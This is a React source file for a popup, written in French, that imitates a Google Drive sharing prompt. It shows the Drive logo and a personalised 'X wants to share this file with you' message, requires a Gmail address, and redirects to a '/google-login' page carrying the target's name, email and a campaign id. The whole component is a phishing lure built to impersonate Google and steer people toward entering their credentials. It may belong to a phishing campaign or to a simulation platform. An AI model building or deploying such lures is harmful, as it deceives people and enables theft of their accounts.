import React, { useState } from 'react';
import { createPortal } from 'react-dom';
import styles from '../../styles/components/CommonPopup.module.css';

const AuthPopup = ({ 
  isVisible, 
  onClose, 
  campaignData,
  redirectPath = '/google-login',
  landingType = 'default' // NOUVEAU: pour différencier Drive des autres landings
}) => {
  const [isRedirecting, setIsRedirecting] = useState(false);
  
  // NOUVEAUX STATES pour la gestion de l'email (spécifique Drive)
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');
  const [isEmailValid, setIsEmailValid] = useState(false);
  
  if (!isVisible) return null;

  // NOUVELLE FONCTION: Validation Gmail
  const validateGmailAddress = (email) => {
    const emailRegex = /^[^\s@]+@gmail\.com$/i;
    return emailRegex.test(email);
  };

  // NOUVELLE FONCTION: Gestionnaire de changement d'email (sans validation en live)
  const handleEmailChange = (e) => {
    const emailValue = e.target.value.trim();
    setEmail(emailValue);
    
    // Réinitialiser les erreurs au changement d'email
    setEmailError('');
    setIsEmailValid(emailValue.length > 0);
  };

  const handleAuthRedirect = () => {
    // MODIFICATION: Validation email pour Drive (uniquement à la soumission)
    if (landingType === 'drive') {
      if (!email) {
        setEmailError('Veuillez saisir votre adresse email');
        return;
      }
      if (!validateGmailAddress(email)) {
        setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
        return;
      }
    }
    
    // Activer l'état de redirection pour feedback visuel
    setIsRedirecting(true);
    
    // Construire l'URL avec les paramètres de campagne
    const params = new URLSearchParams();
    
    if (landingType === 'drive') {
      // Pour Drive: ne passer que l'email saisi et la campagne
      if (email) {
        params.append('email', email);
      }
      if (campaignData?.id) {
        params.append('campaign', campaignData.id);
      }
    } else {
      // Pour les autres landings: utiliser toutes les données de campagne
      if (campaignData?.firstName) {
        params.append('firstName', campaignData.firstName);
      }
      if (campaignData?.lastName) {
        params.append('lastName', campaignData.lastName);
      }
      if (campaignData?.email) {
        params.append('email', campaignData.email);
      }
      if (campaignData?.id) {
        params.append('campaign', campaignData.id);
      }
    }
    
    const redirectUrl = `${redirectPath}?${params.toString()}`;
    
    // Rediriger après un court délai avec feedback visuel
    setTimeout(() => {
      window.location.href = redirectUrl;
    }, 1500); // Réduit de 3-5s à 1.5s
  };

  const handlePopupClick = (e) => {
    // Empêcher la fermeture si on clique à l'intérieur du popup
    e.stopPropagation();
  };

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={styles.popup} onClick={handlePopupClick} data-popup="true">
        {/* Croix de fermeture */}
        <button className={styles.closeBtn} onClick={onClose}>
          ×
        </button>
        
        <div className={styles.content}>
          <div className={styles.iconContainer}>
            <img 
              src="https://static.vecteezy.com/system/resources/previews/012/871/368/non_2x/google-drive-icon-google-product-illustration-free-png.png"
              alt="Google Drive"
              className={styles.miniHeaderIcon}
            />
          </div>
          
          <h3 className={styles.title}>
            Autorisation nécessaire
          </h3>
          
          <p className={styles.subtitle}>
            Ce fichier nécessite une autorisation pour y accéder.
          </p>

          <p className={styles.description}>
            {campaignData?.firstName && campaignData?.lastName
              ? `${campaignData.firstName} ${campaignData.lastName} souhaite partager ce fichier avec vous. Connectez-vous à votre compte Google pour l'ouvrir.`
              : 'Ce fichier vous a été partagé. Connectez-vous à votre compte Google pour l\'ouvrir.'
            }
          </p>

          {/* NOUVEAU: Layout conditionnel selon le type de landing */}
          {landingType === 'drive' ? (
            // Layout horizontal pour Drive : Email + Bouton
            <div className={`${styles.buttonContainer} ${styles.horizontal}`}>
              <div className={styles.actionContainer}>
                <div className={styles.emailContainer}>
                  <input
                    type="email"
                    value={email}
                    onChange={handleEmailChange}
                    placeholder="votre.email@gmail.com"
                    className={`${styles.emailInput} ${emailError ? styles.error : ''}`}
                    disabled={isRedirecting}
                  />
                  {emailError && (
                    <div className={styles.emailError}>
                      {emailError}
                    </div>
                  )}
                </div>
                <button 
                  className={styles.actionButton}
                  onClick={handleAuthRedirect}
                  disabled={isRedirecting}
                >
                  {isRedirecting ? (
                    <div className={styles.loadingContainer}>
                      <div className={styles.spinner}></div>
                      <span>Redirection...</span>
                    </div>
                  ) : (
                    'Accéder au fichier'
                  )}
                </button>
              </div>
            </div>
          ) : (
            // Layout classique pour les autres landings : Bouton seul
            <div className={styles.buttonContainer}>
              <button 
                className={styles.primaryButton}
                onClick={handleAuthRedirect}
                disabled={isRedirecting}
              >
                {isRedirecting ? (
                  <div className={styles.loadingContainer}>
                    <div className={styles.spinner}></div>
                    <span>Redirection en cours...</span>
                  </div>
                ) : (
                  'Accéder au fichier'
                )}
              </button>
            </div>
          )}
          
          {isRedirecting && (
            <div className={styles.redirectingMessage}>
              <p>🔄 Redirection vers Google en cours...</p>
              <p className={styles.redirectingSubtext}>
                Vous allez être redirigé automatiquement.
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour afficher la popup au niveau du body
  return createPortal(popupContent, document.body);
};

export default AuthPopup; 